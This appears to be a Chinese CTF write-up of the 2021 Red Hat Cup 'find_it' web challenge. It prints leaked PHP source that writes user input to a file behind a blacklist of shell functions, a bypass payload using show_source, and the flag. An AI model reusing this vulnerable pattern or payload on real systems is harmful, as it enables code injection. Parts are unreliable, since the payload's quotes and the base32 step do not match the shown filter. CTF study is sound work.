---
title: 红帽杯2021 find_it
categories: CTF Web
tags: robots.txt vim交换文件 黑名单绕过 字符串拼接
---

# 红帽杯2021 find_it
## 题目信息
平台：CTFHub
考点：robots.txt信息泄露、vim交换文件源码泄露、关键词黑名单绕过、文件写入

## 源码分析
访问`/robots.txt`得到提示文件`1ndexx.php`，首字符为数字1。
访问`.1ndexx.php.swp`下载vim交换文件，拿到PHP源码：
```php
<?php
$link = mysql_connect('localhost', 'ctfhub', 'ctfhub');
?>
<html>
<head>
    <title>Hello world!</title>
    <style>
        body {
            background-color: white;
            text-align: center;
            padding: 50px;
            font-family: "Open Sans",Helvetica,Arial,sans-serif;
        }
        #logo {
            margin-bottom: 40px;
        }
    </style>
</head>
<body>
<img id="logo" src="logo.png" />
<h1><?php echo "Hello My freind!"; ?></h1>
<?php if($link) { ?>
    <h2>I Can't view my php files?!</h2>
<?php } else { ?>
    <h2>MySQL Server version: <?php echo mysql_get_server_info(); ?></h2>
<?php } ?>
</body>
<?php
$file=fopen("flag.php","r") or die("Unable 2 open!");
$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize("flag.php"));
$hack=fopen("hack.php","w") or die("Unable 2 open");
$s=$_GET['code'];
if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg_replace|create|function|call|\`|\'|\"|flag|cat| tac|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|var_dump/',$s)){
    die("you die");
}
if(strlen($s)>33){
    die("nonono.");
}
fwrite($hack,$s);
fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);
fclose($file);
fclose($hack);
?>
解题思路

1. 访问robots.txt，获取隐藏文件名称1ndexx.php。

2. 访问.1ndexx.php.swpvim交换文件，下载拿到完整源码。

3. 源码接收GET参数code，正则黑名单禁止直接出现flag单词，同时限制字符串长度≤33。

4. 使用字符串拼接"fl"."ag.php"，拆分flag关键词绕过黑名单，搭配短标签<?=节省字符。

5. 第一步访问带code参数的1ndexx.php，把代码写入hack.php；第二步访问hack.php得到base32编码字符串，base32解码得到最终flag。

Payload
1ndexx.php?code=<?=show_source("fl"."ag.php");?>
Flag

ctfhub{599bbdd0fa8ff600cc8c4a726d44850}